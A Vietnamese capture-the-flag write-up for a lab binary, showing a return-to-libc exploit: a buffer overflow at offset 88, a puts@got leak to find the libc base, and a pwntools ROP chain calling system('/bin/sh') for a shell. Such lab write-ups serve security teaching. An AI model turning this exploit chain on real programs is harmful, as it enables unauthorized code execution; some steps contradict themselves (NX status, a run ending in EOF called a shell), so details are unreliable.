# *Challenge: ret2libc_chall*
***

- **ret2libc (return-to-libc)** là kỹ thuật lợi dụng lỗ hổng tràn bộ đệm để điều khiển luồng thực thi chương trình bằng cách gọi trực tiếp các hàm trong thư viện libc (thường là system(), exit(), và truyền tham số "/bin/sh").
- *Các chế độ bảo vệ ảnh hưởng đến ret2libc:*
 ```
| **Cơ chế bảo vệ** | **Ảnh hưởng đến ret2libc** | **Ghi chú**           |
| ----------------- | -------------------------- | --------------------- |
| NX                | ✅ HỖ TRỢ                   | Không cần shellcode   |
| Canary            | ❌ CẢN TRỞ                  | Phải leak hoặc bypass |
| PIE               | ❌ CẢN TRỞ                  | Cần leak base binary  |
| ASLR              | ❌ CẢN TRỞ                  | Cần leak libc base    |
| RELRO             | ⚠️ Không ảnh hưởng nhiều   | Không overwrite GOT   |
```
*- Với file chall:*
```sh
pwndbg> checksec
File:     /mnt/d/Documents/ISP/TASK1/4_ret2libc/ret2libc/player/ret2libc_chall
Arch:     amd64
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
pwndbg>
```

- No canary -> có thể buffer overflow
- NX ko bật -> ko thể thực thi shellcode trực tiếp trên stack
- PIE: No PIE -> các địa chỉ của file là cố định
- Các chế độ bảo vệ khác không ảnh hưởng
```sh
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
          0x400000           0x401000 r--p     1000       0 ret2libc_chall
          0x401000           0x402000 r-xp     1000    1000 ret2libc_chall
          0x402000           0x403000 r--p     1000    2000 ret2libc_chall
          0x403000           0x404000 r--p     1000    2000 ret2libc_chall
          0x404000           0x405000 rw-p     1000    3000 ret2libc_chall
    0x7ffff7dc1000     0x7ffff7dc4000 rw-p     3000       0 [anon_7ffff7dc1]
    0x7ffff7dc4000     0x7ffff7dec000 r--p    28000       0 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7dec000     0x7ffff7f51000 r-xp   165000   28000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7f51000     0x7ffff7fa7000 r--p    56000  18d000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7fa7000     0x7ffff7fab000 r--p     4000  1e2000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7fab000     0x7ffff7fad000 rw-p     2000  1e6000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7fad000     0x7ffff7fba000 rw-p     d000       0 [anon_7ffff7fad]
    0x7ffff7fbf000     0x7ffff7fc1000 rw-p     2000       0 [anon_7ffff7fbf]
    0x7ffff7fc1000     0x7ffff7fc5000 r--p     4000       0 [vvar]
    0x7ffff7fc5000     0x7ffff7fc7000 r-xp     2000       0 [vdso]
    0x7ffff7fc7000     0x7ffff7fc8000 r--p     1000       0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fc8000     0x7ffff7ff0000 r-xp    28000    1000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ff0000     0x7ffff7ffb000 r--p     b000   29000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000   34000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000   36000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000       0 [anon_7ffff7ffe]
    0x7ffffffde000     0x7ffffffff000 rw-p    21000       0 [stack]
```
- Các địa chỉ của file bin là tĩnh và các địa chỉ của hàm trong thư viện libc là động -> cần leak
**Xem pseudo code ở IDA xem, chương trình hoạt động ntn:**
- Có chỉ có 2 hàm chính init() và main():
Mô tả chương trình: Đầu tiên khởi tạo buffer buf[80] sau đó gọi hàm init để khởi tạo các bộ đệm, nhập buf bằng gets và kết thúc chương trình
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[80]; // [rsp+0h] [rbp-50h] BYREF

  init(argc, argv, envp);
  puts("Say something: ");
  read(0, buf, 120uLL);
  return 0;
}
```
```c
void init()
{
  setbuf(stdin, 0LL);
  setbuf(stderr, 0LL);
  setbuf(stdout, 0LL);
}
```

* **Nhận diện ret2libc:**
- Stack có thể bị overflow do khai báo 80 mà nhập tận 120 nhưng không thực thi được shellcode trên stack (NX enabled)
- Có thư viện libc, nhưng không có cơ chế bảo vệ mạnh như PIE hoặc Canary
- Chương trình gọi gets(), scanf(), read() vào biến local
-> **Mục tiêu:** Mình phải leak đc địa chỉ của libc từ đó tạo shell và chiếm shell.

**Phân tích:**
- Đầu tiên ta tìm offset của hàm read đến ret
 ```sh
 pwndbg> cyclic -l 0x616161616161616c
Finding cyclic pattern of 8 bytes: b'laaaaaaa' (hex: 0x6c61616161616161)
Found at offset 88
pwndbg>
```
-> 88 byte
**Khái niệm và GOT và PLT:*
- GOT (Global Offset Table): là nơi chứa địa chỉ các hàm trong thư viện libc
- PTL (Procedure Linkege Table): là nơi thực thi những hàm bên trong GOT
* Mục tiêu của ret2libc: ta sẽ thực thi hàm system(“/bin/sh”) ở trong thư viện libc . Đầu tiên ta phải leak đc địa chỉ của libc sau đó lấy shell
***Stage 1: Leak địa chỉ libc:***
- Đầu tiên, ta tìm 1 gadget để điều khiển thanh ghi rdi:
 ```sh
 $ ROPgadget --binary ret2libc_chall | grep "pop rdi"
0x0000000000401263 : pop rdi ; ret
```
- Ta có thể thiết lập thanh ghi rdi thành put@got, sau khi ta thiết đc argument 1 của hàm puts thì ta chỉ cần thực thi nó thôi
- Sau đó cho chạy lại hàm main và đã có quyền điều khiển chương trình
 ```py
 pop_rdi = 0x0000000000401263

payload = b'a'*88 + p64(pop_rdi) + p64(exe.got['puts']) + p64(exe.plt['puts']) + p64(exe.sym['main'])
p.sendafter(b'something: \n', payload)
```
- Sau đó ta leak địa chỉ của libc bằng cách lấy đủ 6 byte nhận đc + 2 byte null cho đủ 8 byte của hàm u64() rồi in ra địa chỉ dưới dạng hex để kiểm tra
```py
libc_leak = u64(p.recv(6) + b'\0\0')
print("Libc leak: " + hex(libc_leak))
``` 
*-> có đc libc_leak 3 byte cuối luôn giống nhau ( lưu đây là địa chỉ libc của máy, mỗi máy khác nhau sẽ chạy 1 hệ điều hành libc khác nhau)* 
- Nhưng khi kết nối với sever, ta thấy libc_leak sẽ khác với ở local ( run sever ở folder docker)
 ```sh
 $ ./solve.py
[+] Opening connection to 127.0.0.1 on port 9993: Done
Libc leak: 0x7f35bc4c53a0
[*] Switching to interactive mode
Say something:
$
```
- Giờ ta sẽ cần tìm 1 cái libc tương tự với cái libc địa chỉ của sever bằng 1 trang web có sẵn đó là https://libc.rip/
- Ta đang địa chỉ của hàm puts nên sẽ điền puts vào symbol, còn address sẽ là địa chỉ libc_leak ta vừa leak trên sever
    ```
    Symbol name                  Address
    puts                         3a0
    ```
- Sẽ cho ra kết quả của các libc đều có 3 byte cuối là 3a0 nên ta buộc phải thử từng file libc để tìm ra đúng cái libc mà sever đang chạy thì ta gửi dữ liệu mới đúng
- Để kiểm tra ta sẽ dùng tool pwninit để patch file bin của mình với file libc vừa download về.
- Ta sẽ thử lần lượt khai thác với các file libc tải trên web về, cái nào mà khai thác được cả trên local với sever đều được thì là file đúng.
- Ta thử với file đầu tiên libc6-amd64_2.31-0ubuntu9.3_i386.so.
- Tiếp theo ta sẽ tính địa chỉ libc base ( là địa chỉ nhỏ nhất của file libc mà ta có được), ta có leak_base = địa chỉ libc_leak – địa chỉ của puts trong libc
 ```py
 libc.address = libc_leak - libc.sym['puts']
 ```
- Rồi in ra để kiểm tra
```sh
Libc Leak: 0x7fc14d2343a0
Libc base: 0x7fc14d1bc000
```
  -> như này là ok
***Stage 2: Lấy shell qua hàm system trong libc:***
- Sau khi gửi payload trước chương trình sẽ thực hiện lại hàm main, nên ta có payload mới vẫn sẽ truyền vào 88 byte rác trước sau đó ta truyền pop_rdi tìm đc trước đó để thiết lập argument1 của system().
- Do libc đã có sẵn địa chỉ /bin/sh rồi ta đã sẽ p64 vào payload luôn bằng lệnh next(libc.search(b'/bin/sh')) ( lệnh này sẽ trả về địa chỉ chuỗi chuỗi /bin/sh trong libc)
- Sau khi thiết lập được argument1 thì ta chỉ cần thực thi hàm system trong libc thôi
- Ta có script:
 ```py
 #Payload
payload = b'a'*88 + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym.system)
p.sendafter(b'something: \n', payload)
p.interactive()
```
- Giờ ta chạy thử solve.py xem chiếm đc shell chưa:
 
- chưa được nên ta sẽ thử file libc khác trên web
- Tương tự với các file libc khác sẽ có 1 file đúng đó là libc6-amd64_2.31-0ubuntu9.1_i386
- Ta sẽ patch lại với file binary rồi nộp thử ở local
```sh
$ python3 solve.py
[+] Starting local process '/mnt/d/Documents/ISP/TASK1/4_ret2libc/ret2libc/player/ret2libc_chall': pid 374
Libc leak: 0x7f8f4c5ec5a0
Libc base: 0x7f8f4c574200
bin_shell: 0x7f8f4c70236a
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
```
  -> đã chiếm đc shell
- Giờ ta sẽ nộp lên sever với ip: 127.0.0.1 và port: 9993 để lấy cờ
```
Flag: JHT{y0u_g0t_m3_n0w}
```
 
